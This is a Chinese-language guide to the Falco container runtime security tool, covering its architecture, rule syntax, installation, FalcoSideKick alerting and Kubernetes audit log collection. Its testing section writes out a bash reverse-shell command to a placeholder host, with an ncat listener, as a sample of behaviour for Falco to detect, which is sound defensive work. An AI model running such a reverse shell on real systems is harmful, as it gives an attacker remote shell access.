# [falco](https://falco.org)

* 是云原生的容器运行时（Runtime）安全项目，主要有 Sysdig 为主开发，为 CNCF 项目，近日 Sysdig 宣布将底层的内核模块、eBPF 探针和库贡献给 CNC
* 为云原生容器安全而生，可以通过灵活的规则引擎来描述任何类型的主机或者容器的行为和活动，在触发策略规则后可以实时发出警报告警，同时支持将告警集成到各种工作流或者告警通道；
* 同时 Falco 可利用最新的检测规则针对恶意活动和 CVE 漏洞发出警报，而且规则可以实现动态更新和开箱即用。

## 架构

* Falco：为基于规则扫描后的命令行展示，有点类似于 tcpdump，本身可以提供 gRPC 服务，用于前端界面连接和采集；
* Rule Engine：将 Falco 中定义的各种 yaml 规则解析到规则引擎中，并负责过滤和触发事件至 Falco 中；
* libsinsp：对于从 libscap 上报的底层事件进行信息获取、补充并发送至 Rule Engin 进行过滤；
* libscap：该库提供了类似于 libpcap（tcpdump 底层网络获取库）的功能，用于设置采集控制参数、保存文件和操作系统层面状态的搜集；
* kernel
  - Kernel Module：使用的内核模块，采用动态内核模块支持 (DKMS) 来编译和安装内核模块；
  - eBPF Probe：作为 Kernel Module 的替换技术，只在内核较高的系统中才能完全支持，通过设置环境变量 FALCO_BPF_PROBE 进行切换；
* Falco 还支持 k8s audit 日志的采集，需要在 k8s kube-apiserver 则通过 webhook 配置支持，支持的字段可以通过 falco --list k8s_audit 进行查看

## 事件源

* Falco Drivers：Falco 的内置驱动主要有 Kernel Module、eBPF Probe 和用户空间检测 3 种。当前用户空间检测已经具备了整体框架，但是目前还没有官方的支持 Driver（v0.24.0 版本开始支持）。其中 Kernel Module 和 eBPF Probe 主要是采集系统的系统调用（syscall），eBPF Probe 是作为 Kernel Module 替代方案存在的，性能高效且能够提供更好的安全性（避免内核 Bug），但是对于内核版本有一定的要求（一般建议 4.10 以后 ）。
* Kubernetes 审计事件：对接 k8s 系统中 kube-apiserver 产生的审计事件，规则在 falco k8s_audit_rules.yaml[2] 中定义，该事件源需要修改 kube-apiserver 中对于 audit 日志的保存方式，需要调整成基于 webhook 的方式，将审计日志发送到 Falco 内置的服务端口上。
* 丢弃系统调用事件：Falco 可以智能检测系统调用丢弃的事件（ v0.15.0 以后的版本），可以基于规则进行告警。

## 规则

* falco_rules.yaml：falco 中关于文件、进程和网络等相关的规则定义；
* falco_rules.local.yaml：用于我们本地扩展规则；
* k8s_audit_rules.yaml：k8s 审计日志规则，内部启动内置服务 8765 端口在默认路径 /k8s_audit 上接受 k8s 的审计日志并经过规则过滤生成相对应的告警，[完整文件](https://github.com/falcosecurity/falco/tree/master/rules)
* 字段
  - rule：规则的名字
  - desc：规则的描述
  - condition：条件是重点，其中的各种条件 allowed_port 、inbound_outbound 等都为规则中定义的宏，这些宏也可以在本文件中找到；例如宏 inbound_outbound 的定义
  - output：符合条件事件的输出格式，文字中 %proc.cmdline 等为变量从本次触发的事件中提取
  - priority：告警的优先级
  - tags：本条规则的 tags 分类，本条为 network

```yaml
- rule: Outbound or Inbound Traffic not to Authorized Server Process and Port
  desc: Detect traffic that is not to authorized server process and port.
  condition: >
    allowed_port and
    inbound_outbound and
    container and
    container.image.repository in (allowed_image) and
    not proc.name in (authorized_server_binary) and
    not fd.sport in (authorized_server_port)
  output: >
    Network connection outside authorized port and binary
    (command=%proc.cmdline connection=%fd.name user=%user.name user_loginuid=%user.loginuid container_id=%container.id
    image=%container.image.repository)
  priority: WARNING
  tags: [network]
```

## 安装

```sh
# 单机安装
apt-get -y install linux-headers-$(uname -r)
# 或者
yum -y install kernel-devel-$(uname -r)

# Docker 方式运行
sudo docker pull falcosecurity/falco:latest
sudo docker run --rm -i -t \
     --privileged \
     -e FALCO_BPF_PROBE="" \
     -v /var/run/docker.sock:/host/var/run/docker.sock \
     -v /dev:/host/dev \
     -v /proc:/host/proc:ro \
     -v /boot:/host/boot:ro \
     -v /lib/modules:/host/lib/modules:ro \
     -v /usr:/host/usr:ro \
     -v /etc:/host/etc:ro \
     falcosecurity/falco:latest
```

## FalcoSideKick 告警集中化展示

* 支持将日志按照 gGPRC/File/STDOUT/SHELL/HTTP 等多种方式进行输出
* 可以通过 HTTP 方式将日志汇总到部署的 FalcoSideKick 服务，FalcoSideKick 服务可以实现更加丰富的告警通道能力，包括 Slack/Altermanager/SMTP 等多种告警通道输出。同时 FalcoSideKick 还支持将数据输出到 FalcoSideKick UI，用户可以通过界面进行查看

```yaml
# falco.yaml
json_output: true
json_include_output_property: true
http_output:
  enabled: true
  url: "http://172.17.0.14:2801/"
# 开启了内部嵌入服务
webserver:
   enabled: true
   listen_port: 8765
   k8s_audit_endpoint: /k8s_audit
   ssl_enabled: false
   ssl_certificate: /etc/falco/falco.pem
```

```sh
kill -1 $(cat /var/run/falco.pid)

# 启动 falcosidekick 和 falcosidekick-ui
sudo docker run -d -p 2801:2801 -e WEBUI_URL=http://172.17.0.14:2802 falcosecurity/falcosidekick
sudo docker run -d -p 2802:2802 falcosecurity/falcosidekick-ui
```

## 测试

```sh
# 在 Falco 机器上通过登录到本机的 Pod 实例（或者容器实例）中测试：

# 在另外一个窗口执行
docker exec -ti e6a37f5f7c33  /bin/bash -il

# 在一台攻击的机器上启动 ncat：
# ncat -l -p 10000
# 在 shell 反弹成功后可以拿到 Pod 的 shell 权限，界面如下：
  root@xxx:/#

# 在上个样例中登录的 Pod 中执行一下命令，那么在上述攻击的机器的命令行中就会得到该 Pod 的 shell 权限,对于这种行为 falco 可以进行检测和发现
root@backend-05:/# bash -i >& /dev/tcp/a.b.c.d/10000 0>&1
```

## k8s audit 日志采集

* 启动一个内部内嵌的服务端，用于接受 k8s audit 日志输出，需要在 k8s 中定义相关的规则将 audit 日志提交至该服务，然后经相关规则定义后，输出可能触发的告警信息

```sh
cat <<EOF > /etc/kubernetes/audit-webhook-kubeconfig
apiVersion: v1
kind: Config
clusters:
- cluster:
    server: http://<ip_of_falco>:8765/k8s_audit
  name: falco
contexts:
- context:
    cluster: falco
    user: ""
  name: default-context
current-context: default-context
preferences: {}
users: []
EOF

# api-server 启动中添加对应的文件：
--audit-policy-file=/etc/kubernetes/audit-policy.yaml --audit-webhook-config-file=/etc/kubernetes/audit-webhook-kubeconfig
```
